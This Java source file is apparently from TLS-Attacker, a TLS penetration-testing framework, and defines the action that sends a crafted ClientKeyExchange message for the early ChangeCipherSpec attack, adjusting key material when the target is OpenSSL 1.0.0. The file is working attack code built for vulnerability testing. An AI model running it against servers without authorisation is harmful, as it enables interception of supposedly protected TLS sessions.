/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.actions;

import de.rub.nds.modifiablevariable.bool.BooleanExplicitValueModification;
import de.rub.nds.modifiablevariable.bool.ModifiableBoolean;
import de.rub.nds.modifiablevariable.util.Modifiable;
import de.rub.nds.tlsattacker.core.constants.AlgorithmResolver;
import de.rub.nds.tlsattacker.core.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.core.protocol.handler.ClientKeyExchangeHandler;
import de.rub.nds.tlsattacker.core.protocol.message.ClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.record.AbstractRecord;
import de.rub.nds.tlsattacker.core.record.Record;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.action.TlsAction;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import java.io.IOException;
import java.util.LinkedList;
import java.util.List;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * This Action is used by the EarlyCcs Attack. It sends a ClientKeyExchange
 * message and adjusts the cryptographic material accordingly.
 *
 */
public class EarlyCcsAction extends TlsAction {

    private static final Logger LOGGER = LogManager.getLogger();

    private final Boolean targetOpenssl1_0_0;

    private boolean executedAsPlanned = false;

    /**
     * Constructor for the Action. If the target is Openssl 1.0.0 the boolean
     * value should be set to true
     *
     * @param targetsOpenssl1_0_0
     *            If the target is an openssl 1.0.0 server
     */
    public EarlyCcsAction(Boolean targetsOpenssl1_0_0) {
        this.targetOpenssl1_0_0 = targetsOpenssl1_0_0;
    }

    /**
     * Sends a ClientKeyExchange message depending on the currently selected
     * ciphersuite. Depening on the target version cryptographic material is
     * adjusted.
     *
     * @param state
     *            the State in which the action should be executed in
     */
    @Override
    public void execute(State state) {
        WorkflowConfigurationFactory factory = new WorkflowConfigurationFactory(state.getConfig());
        ClientKeyExchangeMessage message = factory.createClientKeyExchangeMessage(AlgorithmResolver
                .getKeyExchangeAlgorithm(state.getTlsContext().getChooser().getSelectedCipherSuite()));
        if (!targetOpenssl1_0_0) {
            message.setIncludeInDigest(Modifiable.explicit(false));
        }
        message.setAdjustContext(Modifiable.explicit(false));
        ClientKeyExchangeHandler handler = (ClientKeyExchangeHandler) message.getHandler(state.getTlsContext());
        byte[] protocolMessageBytes = handler.prepareMessage(message);
        if (targetOpenssl1_0_0) {
            handler.adjustPremasterSecret(message);
            handler.adjustMasterSecret(message);
        }
        handler.adjustTlsContextAfterSerialize(message);
        List<AbstractRecord> recordList = new LinkedList<>();
        Record r = new Record();
        r.setContentMessageType(ProtocolMessageType.HANDSHAKE);
        recordList.add(r);
        byte[] prepareRecords = state.getTlsContext().getRecordLayer()
                .prepareRecords(protocolMessageBytes, ProtocolMessageType.HANDSHAKE, recordList);
        try {
            state.getTlsContext().getTransportHandler().sendData(prepareRecords);
            executedAsPlanned = true;
        } catch (IOException E) {
            LOGGER.debug("Could not write Data to stream", E);
            executedAsPlanned = false;
        }
        setExecuted(true);

    }

    /**
     * Rests the executed state of the action
     */
    @Override
    public void reset() {
        setExecuted(false);
        executedAsPlanned = false;
    }

    @Override
    public boolean executedAsPlanned() {
        return executedAsPlanned;
    }

}
